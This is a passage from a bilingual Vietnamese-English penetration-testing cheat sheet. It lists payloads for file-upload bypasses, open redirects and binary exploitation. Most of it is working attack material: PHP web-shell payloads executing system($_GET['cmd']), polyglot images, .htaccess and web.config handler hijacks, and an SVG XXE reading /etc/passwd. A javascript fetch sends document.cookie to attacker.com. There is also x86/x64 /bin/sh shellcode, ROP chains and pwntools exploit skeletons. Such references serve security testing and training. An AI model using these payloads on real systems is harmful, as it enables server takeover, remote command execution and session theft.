*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử thay đổi phần mở rộng tệp tin thành đuôi thay thế, đổi hoa thường hoặc chèn Null Byte.
    *   *English*: Change parameters to alternative extensions, mixed-case strings, or append null bytes.
*   **Payloads (10 Payloads)**:
```
    # 1. Alternative PHP Extensions
    shell.php3                                           # Alternative PHP 3 execution handler
    shell.php4                                           # Alternative PHP 4 execution handler
    shell.php5                                           # Alternative PHP 5 execution handler
    shell.phtml                                          # Inline HTML/PHP parse bypass extension
    shell.phar                                           # PHP Archive executable file type extension

    # 2. Case Mutation Bypass
    shell.pHp                                            # Mixed-case extension bypass
    shell.PhP5                                           # Mixed-case PHP5 extension bypass
    shell.Phtml                                          # Mixed-case Phtml extension bypass

    # 3. Null Byte Injection (PHP <= 5.3.x) (⚠️ Version Warning: Null byte injection requires PHP < 5.3.4)
    shell.php%00.jpg                                     # ⚠️ URL encoded null byte truncation bypass (requires PHP < 5.3.4)
    shell.php\\x00.jpg                                    # ⚠️ Hexadecimal representation null byte bypass (requires PHP < 5.3.4)

    # 4. Path Traversal in Filename Parameter
    ../../../shell.php                                  # Directory traversal to escape upload container
    ..%2f..%2f..%2fshell.php                             # URL encoded traversal bypass

    # 5. Windows NTFS Alternate Data Streams (ADS) Bypass
    shell.php::$DATA                                     # Appends Windows alternate data stream structure
    shell.php:.jpg                                       # Creates secondary alternate JPEG stream
    shell.php::$DATA.jpg                                 # Windows ADS extension mapping bypass

    # 6. Double Extension & Regex Bypass (Replace once bypass)
    shell.p.phphp                                        # Resolves to shell.php if 'php' is stripped once
    shell.ph.phpphp                                      # Alternative double strip recursion bypass

    # 7. Trailing spaces/dots bypass
    shell.php. .                                         # Bypasses space trimming algorithms
    shell.php.                                           # Trailing dot Windows directory mapping bypass

    # 8. Semicolon IIS upload bypass
    shell.asp;.jpg                                       # IIS server executes file using first extension segment

    # 9. Reverse proxy double dot bypass
    ..%252f..%252fshell.php                              # Double-URL encoded traversal path

    # 10. Long extension truncation bypass
    shell.php.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.jpg       # Bypasses extension checks using buffer limits
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Burp Suite Intruder fuzzing danh sách đuôi tệp tin thay thế từ SecLists.
    *   *English*: Run Burp Suite Intruder to fuzz parameter extensions using alternative wordlists.


---

### 13.2. Content-Type & Signature Validation Bypass
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng kiểm tra cấu trúc nội dung tệp (MIME type hoặc Magic Bytes) thay vì chỉ kiểm tra tên tệp.
    *   *English*: Server evaluates file MIME-types or magic byte signatures instead of just the filename.

    ```bash
    # Use curl to upload a file with a spoofed Content-Type header
    curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thay đổi giá trị Header Content-Type hoặc chèn các byte đặc trưng của ảnh (Magic Bytes) vào đầu Web Shell.
    *   *English*: Tamper with Content-Type headers or prepend image file signatures to code strings.
*   **Payloads (10 Payloads)**:
```
    # 1. Magic Bytes JPEG Signature + PHP code (Raw Hex: FF D8 FF E0)
    \\xff\\xd8\\xff\\xe0<?php system($_GET['cmd']); ?>      # Prepends standard JPEG signature bytes

    # 2. Magic Bytes GIF Signature + PHP code (Raw Hex: 47 49 46 38 39 61, ASCII: GIF89a)
    GIF89a;\\n<?php system($_GET['cmd']); ?>              # Prepends standard GIF signature bytes

    # 3. Magic Bytes PNG Signature + PHP code (Raw Hex: 89 50 4E 47 0D 0A 1A 0A)
    \\x89PNG\\r\\n\\x1a\\n<?php system($_GET['cmd']); ?>    # Prepends standard PNG signature bytes

    # 4. Magic Bytes PDF Signature + PHP code
    %PDF-1.4\\n<?php system($_GET['cmd']); ?>             # Prepends standard PDF signature bytes

    # 5. Content-Type Header modification (JPEG)
    Content-Type: image/jpeg                             # Spoofs content type to indicate image resource

    # 6. Content-Type Header modification (PNG)
    Content-Type: image/png                              # Spoofs content type to indicate PNG resource

    # 7. Client-side JS validation bypass via request tampering (repeater)
    # Intercept request in proxy and change extension from .jpg to .php

    # 8. Image size validation bypass by copying valid image dimensions into payload
    # Inject command payload into a large, valid image block

    # 9. Metadata EXIF field injection (injecting php shell in EXIF Artist field)
    # exiftool -Artist="<?php system($_GET['cmd']); ?>" shell.jpg

    # 10. Double Content-Type headers injection bypass
    # Content-Type: image/jpeg\\nContent-Type: application/x-php
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Cấu hình Burp Suite Intruder để gửi payload và tự động thay đổi Content-Type tương ứng.
    *   *English*: Configure Burp Suite Intruder payloads to target content type structures.


---

### 13.3. Web Server Configuration & File Execution Hijacking
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Tệp tin tải lên thành công nhưng không thực thi được do thư mục upload tắt quyền chạy script.
    *   *English*: Files are successfully saved, but cannot execute due to write-only permissions on target folders.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử tải lên tệp tin cấu hình (`.htaccess`, `web.config`) để cấu hình lại quyền chạy của thư mục, hoặc sử dụng SVG XSS/XXE và Polyglot PNG.
    *   *English*: Attempt loading directory configuration files (`.htaccess`), SVG files, or PNG polyglots.
*   **Payloads (10 Payloads)**:
```xml
    <!-- 1. .htaccess configuration file upload to map .jpg to PHP handler -->
    # Uploaded filename: .htaccess
    # Content:
    AddType application/x-httpd-php .jpg

    <!-- 2. web.config configuration file upload (IIS) to map .jpg to ASP handler -->
    <!-- Uploaded filename: web.config -->
    <configuration>
      <system.webServer>
        <handlers>
          <add name="jpg-to-asp" path="*.jpg" verb="*" type="System.Web.UI.SimpleHandlerFactory" />
        </handlers>
      </system.webServer>
    </configuration>

    <!-- 3. SVG XSS Payload (triggers JS when viewed in browser) -->
    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>

    <!-- 4. SVG XXE Payload (reads system files during parsing) -->
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
    <svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">
      <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>

    <!-- 5. Polyglot PNG Payload (PHP code hidden in PLTE/IDAT chunks) -->
    <!-- Hex payload including PNG structure hosting active PHP tags -->
    \\x89\\x50\\x4E\\x47\\x0D\\x0A\x1A\\x0A\\x00\\x00\\x00\\x0D\\x49\\x48\\x44\\x52\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x08\\x03\\x00\\x00\\x00\\xF7\\xE1\\x1A\\x10\\x00\\x00\\x00\\x09\\x50\\x4C\\x54\\x45\\x3C\\x3F\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6D\x28$_GET["cmd"]); ?>\\x00\\x00\\x00\\x0A\\x49\\x44\x41\x54\x78\x9C\x63\x60\x00\x00\x00\x02\x00\x01\\xE2\\x25\\xBC\\xE6\\x00\\x00\\x00\\x00\\x49\\x45\\x4E\\x4D

    <!-- 6. Polyglot GIF payload (GIF89a header + PHP tags) -->
    GIF89a;\\n<?php system($_GET['cmd']); ?>

    <!-- 7. .htaccess script execution protection disable override -->
    # Uploaded filename: .htaccess
    # Content:
    RemoveHandler .php
    AddType application/x-httpd-php .php

    <!-- 8. HTML injection via text file upload -->
    # Uploaded filename: test.txt. Content runs dynamic scripts in browser
    <html><body><script>alert(document.domain)</script></body></html>

    <!-- 9. Shellcode injection in image comments using exiftool -->
    # exiftool -Comment="<?php echo shell_exec($_GET['cmd']); ?>" image.png

    <!-- 10. CGI Script upload bypass -->
    # Uploaded filename: script.cgi. Content maps to perl execution
    #!/usr/bin/perl
    print "Content-type: text/html\\n\\n";
    system("id");
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng công cụ `exiftool` để tạo tự động các tệp tin ảnh Polyglot chứa mã độc.
    *   *English*: Deploy exiftool commands to compile valid image polyglots hosting scripts.
    ```bash
    exiftool -Comment="<?php system($_GET['cmd']); ?>" shell.png && mv shell.png shell.php.png
    ```

---

## 14. Open Redirect

Open Redirect xảy ra khi ứng dụng chuyển hướng người dùng đến một địa chỉ URL bên ngoài do người dùng kiểm soát mà không xác thực tên miền đích, cho phép kẻ tấn công thực hiện chiến dịch lừa đảo (Phishing).

### 14.1. Scheme & Domain-based Open Redirect (Absolute Redirect & Protocol-Relative Bypass)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi ứng dụng có tham số trong URL chỉ định đường dẫn chuyển hướng như `?redirect=`, `?next=`, `?url=`.
    *   *English*: Redirection parameters are present in URL query segments (such as `?next=`, `?redirect=`).
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi yêu cầu chuyển hướng trỏ về một trang bên ngoài hoặc sử dụng cú pháp dấu gạch chéo kép `//attacker.com`.
    *   *English*: Pass external URLs or double slash sequences to test if server maps redirection to external locations.
*   **Payloads (10 Payloads)**:
```
    # 1. Basic absolute redirect to external domain
    http://attacker.com                                  # Standard external redirection path

    # 2. Protocol-relative double slash bypass
    //attacker.com                                       # Browser resolves to scheme matching page protocol

    # 3. Protocol-relative triple slash bypass
    ///attacker.com                                      # Evades regexes strictly checking for two slashes

    # 4. Hex-encoded IP redirection target
    http://0x7f000001                                    # Bypasses string checks on loopback IP using Hex

    # 5. Decimal IP representation redirection target (e.g. 2852039166 resolves to 169.254.169.254 for cloud metadata target)
    http://2852039166                                    # Bypasses string checks on IP using Decimal representation

    # 6. Authentication bypass using @ separator
    http://trusted.com@attacker.com                      # Browser connects to domain following @ symbol

    # 7. Authentication bypass with port mapping
    http://trusted.com:80@attacker.com                   # Alternative port routing auth bypass

    # 8. IPv6 address redirection target
    http://[::1]                                         # Dynamic IPv6 loopback route bypass

    # 9. HTTPS to HTTP protocol forcing redirect
    http://attacker.com/                                 # Downgrades scheme parameter to HTTP

    # 10. Combined slash/backslash bypass
    /\\\\attacker.com                                     # Evades basic directory check algorithms
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Oralyzer để quét phát hiện lỗi chuyển hướng tự động.
    *   *English*: Use Oralyzer to automatically scan parameter inputs for redirect vulns.
    ```bash
    python oralyzer.py -u "http://target.com/?next=http://google.com"
    ```


---

### 14.2. Filter & Whitelist Bypass (Subdomain Spoofing & Path Traversal Bypass)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi truyền tên miền ngoài thì bị chặn, nhưng nếu chèn thêm tên miền gốc thì vượt qua được.
    *   *English*: Standard external redirects are blocked, but requests containing the target domain string pass.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử chèn tên miền gốc làm subdomain, thư mục con hoặc dùng ký tự điều hướng `../` để thoát khỏi tên miền được cấu hình tin cậy.
    *   *English*: Spoof whitelisted domains by nesting them in subdomains, query parameters, or directory segments.
*   **Payloads (10 Payloads)**:
```
    # 1. Subdomain suffix spoofing
    http://attacker.com/trusted.com                      # Tricked by presence of trusted segment in path

    # 2. Subdomain prefix spoofing
    http://trusted.com.attacker.com                      # Tricked by trusted domain acting as subdomain

    # 3. Path traversal whitelist bypass
    http://trusted.com/../attacker.com                   # Directory traversal escaping trusted segment

    # 4. Dynamic DNS wildcard bypass
    http://trusted.com.nip.io                            # Resolves to external target through nip.io mapping

    # 5. Double URL encoded redirect parameters
    %252f%252fattacker.com                               # Evades initial signature inspection filters

    # 6. Backslash Windows IIS redirect bypass
    http://trusted.com\\\\attacker.com                     # IIS maps backslashes to parameters

    # 7. Null byte truncation whitelist bypass (⚠️ Warning: Null byte domain truncation in URLs is blocked/ignored by modern browsers and HTTP client libraries)
    http://attacker.com%00trusted.com                    # ⚠️ Parser stops checking after Null Byte (requires legacy client runtime)

    # 8. Parameter spoofing using hash symbol
    http://attacker.com#trusted.com                      # Evaluates trusted segment as URL fragment

    # 9. Parameter spoofing using query parameter
    http://attacker.com?trusted.com                      # Evaluates trusted segment as query parameter

    # 10. Overlong UTF-8 slash encoding bypass
    ..%c0%af..%c0%afattacker.com                         # Bypass using non-standard slash mappings
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Oralyzer với danh sách bypass whitelist tùy biến.
    *   *English*: Configure Oralyzer to fuzz redirect parameters using custom bypass payloads.
    ```bash
    python oralyzer.py -u "http://target.com/?next=http://google.com" --fuzz
    ```


---

### 14.3. Parameter & Protocol Pollution (Parameter Pollution, JS/Data Redirection, CRLF)
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Ứng dụng chuyển hướng sử dụng cơ chế javascript hoặc chèn tham số phản hồi.
    *   *English*: Redirection mechanism executes client-side scripts or dynamically injects parameter header values.

    ```bash
    # Test HTTP Parameter Pollution (HPP) redirect logic
    curl "http://target.com/?next=trusted.com&next=attacker.com"
    # Test CRLF injection in the redirect parameter
    curl -I "http://target.com/?next=%0d%0aLocation:%20http://attacker.com"
    ```
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Thử truyền giao thức `javascript:` hoặc chèn ký tự xuống dòng `%0d%0a` để tiêm header `Location`.
    *   *English*: Test with `javascript:` uri schemes or inject CRLF sequences to split headers.
*   **Payloads (10 Payloads)**:
```html
    <!-- 1. HTTP Parameter Pollution (HPP) bypass -->
    ?next=trusted.com&next=attacker.com                  # Server reads secondary parameter value

    <!-- 2. Javascript URI redirection -->
    javascript:alert(1)                                  # Executes javascript inside page environment

    <!-- 3. Javascript location href redirection -->
    javascript:window.location='http://attacker.com'     # Redirects browser context to external site

    <!-- 4. Data URI redirection -->
    data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== # Loads base64 string directly in page

    <!-- 5. CRLF Injection redirection -->
    %0d%0aLocation:%20http://attacker.com                 # Injects header lines directly into HTTP response

    <!-- 6. VBScript URI redirection -->
    vbscript:msgbox("test")

    <!-- 7. HTML Entity encoded JS redirect -->
    javascript:&#x61;&#x6c;&#x65;&#x72;&#x74;(1)          # Obfuscates javascript function signatures

    <!-- 8. Redirect via meta refresh header injection -->
    %0d%0aRefresh:%200;url=http://attacker.com           # Forces browser reload routing to external URL

    <!-- 9. JS nested redirection in query parameters -->
    javascript:fetch('http://attacker.com/' + document.cookie) # Exfiltrates active cookie parameters

    <!-- 10. XML schema redirection inside SVG/XML files -->
    <svg xmlns="http://www.w3.org/2000/svg"><script href="javascript:alert(1)"/></svg>
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng Burp Suite Repeater để kiểm tra thủ công phản hồi header khi chèn ký tự CRLF hoặc giao thức javascript.
    *   *English*: Use Burp Suite Repeater to manually verify redirection outputs when testing CRLF or javascript protocol strings.

---

## 15. Buffer Overflow / Binary Exploitation

Buffer Overflow xảy ra khi chương trình ghi dữ liệu vượt quá dung lượng của bộ đệm được cấp phát trên Stack hoặc Heap, dẫn đến ghi đè các vùng nhớ nhạy cảm khác như con trỏ lệnh (EIP/RIP) để điều khiển luồng thực thi.

### 15.1. Stack Buffer Overflow & Shellcode Execution
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi truyền dữ liệu đầu vào cực lớn, chương trình bị sập nguồn đột ngột (Segmentation fault / Crash) và xuất hiện trong syslog.
    *   *English*: Program terminates abruptly with "Segmentation fault" or "Access violation" when large inputs are supplied.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Fuzz độ dài đầu vào để xác định dung lượng buffer và dùng cyclic pattern để tính toán offset chính xác của con trỏ lệnh EIP/RIP.
    *   *English*: Fuzz input length to identify the crash threshold and inject cyclic patterns to locate EIP/RIP offsets.
*   **Payloads (10 Payloads)**:
```python
    # 1. Python Cyclic Pattern Generation (pwntools)
    # Generate unique pattern to calculate crash offset
    from pwn import *
    pattern = cyclic(100) # Generates 'aaaabaaacaaa...'

    # 2. Stack Overflow Offset Payload (Conceptual layout)
    # Padding: 40 bytes + EIP Overwrite with target function address (0x080484b6)
    payload = b"A" * 40 + p32(0x080484b6)

    # 3. Shellcode execution with NOP Sled (DEP/NX disabled)
    # NOP sled + x86 shellcode + return address pointing to NOP sled
    shellcode = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
    payload = b"\\x90" * 32 + shellcode + b"A" * (100 - 32 - len(shellcode)) + p32(0xffffd040)

    # 4. 64-bit shellcode execution layout (explicitly defining shellcode_64 variable)
    shellcode_64 = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05"
    payload_64 = b"\x90" * 32 + shellcode_64 + b"A" * 50 + p64(0x7fffffffd040)

    # 5. Environment variable injection payload layout
    # Placing shellcode in env block: export SHELLCODE=$(python -c 'print("\\x90"*100 + shellcode)')

    # 6. Basic stack-based overflow payload using python command line print
    # python -c 'print("A"*1000)'

    # 7. Local exploit script template using python subprocess
    # import subprocess; subprocess.run(["./vuln", payload])

    # 8. Dynamic pattern generation payload for Windows targets
    # pattern_create.rb -l 500

    # 9. checksec verification probe
    # checksec --file=vuln

    # 10. Bad characters detection payload generator
    badchars = b"".join([bytes([i]) for i in range(1, 256)])
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng GDB kết hợp tiện ích mở rộng GEF để tìm kiếm offset crash.
    *   *English*: Use GDB debugger with GEF extension to generate pattern inputs and calculate offsets automatically.
    ```bash
    gdb ./vuln
    gef> pattern create 100
    gef> run <input>
    gef> pattern offset $rip
    ```


---

### 15.2. Return-Oriented Programming & ret2libc
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Trình biên dịch bật tính năng ngăn chặn thực thi trên Stack (NX/DEP enabled), khiến shellcode chèn trên stack không hoạt động.
    *   *English*: Execution protections (NX/DEP) are active on the binary, preventing shellcode execution directly from stack frames.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Kiểm tra các cơ chế bảo vệ bằng checksec. Sử dụng kỹ thuật ROP (Return-Oriented Programming) để gọi các hàm thư viện có sẵn (như `system("/bin/sh")` trong libc).
    *   *English*: Run checksec to verify protection status. Map execution jumps to shared library routines.
*   **Payloads (10 Payloads)**:
```python
    # 1. 32-bit ret2libc exploit payload layout (ASLR disabled)
    # Overwrite return address to call system() with "/bin/sh" string argument
    # Layout: Padding + system() + exit() + "/bin/sh" address
    payload = b"A" * 40 + p32(0x08048390) + p32(0x080483d0) + p32(0x080487b0)

    # 2. 64-bit ret2libc exploit payload layout (ASLR disabled)
    # In x86-64, arguments are passed in registers. We need 'pop rdi; ret' gadget to load "/bin/sh" into RDI.
    # Layout: Padding + pop_rdi_ret + "/bin/sh" address + system() address (⚠️ Note on Stack Alignment (x86-64): Modern glibc system() requires RSP 16-byte alignment. If a segfault occurs, prepend a dummy 'ret' gadget address before pop_rdi_ret)
    payload = b"A" * 40 + p64(0x400600) + p64(0x7ffff7b97000) + p64(0x7ffff7a3a000)

    # 3. Multi-gadget ROP Chain template (building execve("/bin/sh"))
    # ROP chain utilizing multiple registers (RDI, RSI, RDX) to execute execve system call
    # execve("/bin/sh", NULL, NULL) -> RAX=59, RDI=bin_sh, RSI=0, RDX=0
    rop = b"A" * 40
    rop += p64(0x400600)  # pop rdi; ret
    rop += p64(0x7ffff7b97000) # "/bin/sh" address
    rop += p64(0x400700)  # pop rsi; ret
    rop += p64(0)
    rop += p64(0x400800)  # pop rdx; ret
    rop += p64(0)
    rop += p64(0x400900)  # pop rax; ret
    rop += p64(59)        # execve syscall number
    rop += p64(0x401000)  # syscall; ret

    # 4. pwntools dynamic exploit skeleton
    from pwn import *
    elf = ELF('./vuln')
    p = process('./vuln')
    # Leak libc address first using GOT read
    rop_leak = ROP(elf)
    rop_leak.puts(elf.got['puts'])
    rop_leak.main()
    p.sendlineafter(b"Input: ", b"A" * 40 + rop_leak.chain())

    # 5. ROP gadget search command
    # ROPgadget --binary ./vuln --only "pop|ret"

    # 6. Alternative ropper search command
    # ropper --file ./vuln --search "pop rdi"

    # 7. PLT/GOT address lookup command in GDB
    # gef> got

    # 8. ROP chain bypassing ASLR using leaked puts address offset
    # libc_base = puts_leak - libc.symbols['puts']

    # 9. Stack pivoting payload template using pop rsp
    # payload = p64(new_stack_address) + p64(pop_rsp_ret)

    # 10. pwntools ROP library automatic chain generation
    # rop = ROP(elf); rop.system(next(elf.search(b"/bin/sh")))
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng `ROPgadget` để quét tự động các đoạn mã lệnh kết thúc bằng lệnh ret.
    *   *English*: Run ROPgadget command line tool to extract stack manipulation code blocks.
    ```bash
    ROPgadget --binary ./vuln --only "pop|ret"
    ```


---

### 15.3. Binary Security Mechanism Bypasses & Format Strings
*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Chương trình bật đầy đủ ASLR, Stack Canary, PIE hoặc sử dụng hàm in không an toàn (Format String vulnerability).
    *   *English*: Advanced mitigations (Canary, ASLR, PIE) are enabled, or inputs are directly parsed by formatting routines (e.g. `printf(input)`).
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Gửi tham số định dạng `%p`, `%x` để đọc rò rỉ dữ liệu Stack (leaking Canary/ASLR offsets) hoặc dùng `%n` để ghi đè GOT.
    *   *English*: Inject format specifiers `%p` to leak stack secrets (Canary/PIE base addresses) or `%n` to overwrite GOT pointers.
*   **Payloads (10 Payloads)**:
```python
    # 1. Canary Leak payload using format string
    # If canary protection is enabled, read it via %p format string parameter
    # Exploit payload: leak position 11 (which maps to stack canary location)
    payload = b"%11$p"

    # 2. Format String GOT Overwrite payload (using pwntools)
    # Replace GOT entry of print_status with system address
    from pwn import *
    elf = ELF('./vuln')
    payload = fmtstr_payload(4, {elf.got['printf']: elf.symbols['system']})

    # 3. Integer Overflow to stack buffer size bypass
    # Passing size = 0 triggers negative value allocation checks if signed, causing giant buffer overflow
    size_payload = p32(0)

    # 4. Format string arbitrary read payload
    # Leaks data pointing to address: payload = p32(target_address) + b"%4$s"
    payload_read = p32(0x0804a000) + b"%4$s"

    # 5. Format string arbitrary write payload
    # Writes value using byte counts: payload = p32(target_address) + b"%100c%4$n"

    # 6. Heap chunk metadata override template
    # Padding + fake chunk metadata + overwrite pointer
    heap_overflow = b"A" * 32 + p32(0) + p32(0x11) + b"B" * 16

    # 7. Double free vulnerability execution skeleton
    # malloc(A); malloc(B); free(A); free(B); free(A);

    # 8. Use After Free (UAF) exploitation template
    # malloc(object); free(object); malloc(string_buffer_of_same_size); object.method();

    # 9. ASLR bypass using partial overwrite of return address
    # Overwrites only the lower 2 bytes of the saved EIP/RIP pointer

    # 10. PIE bypass using leaked code section base address
    # code_base = leaked_address - offset_to_base
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng thư viện `pwntools` trong Python để tự động tính toán địa chỉ leak và sinh payload format string.
    *   *English*: Use Python's `pwntools` formatting library to automate GOT table overwriting.
    ```bash
    # Python code utilizing pwntools fmtstr_payload to write GOT pointers
    from pwn import *
    elf = ELF('./vuln')
    # Generate payload to overwrite printf GOT entry with system address
    # offset 4 is the stack index where our format string input begins
    payload = fmtstr_payload(4, {elf.got['printf']: elf.symbols['system']})
    ```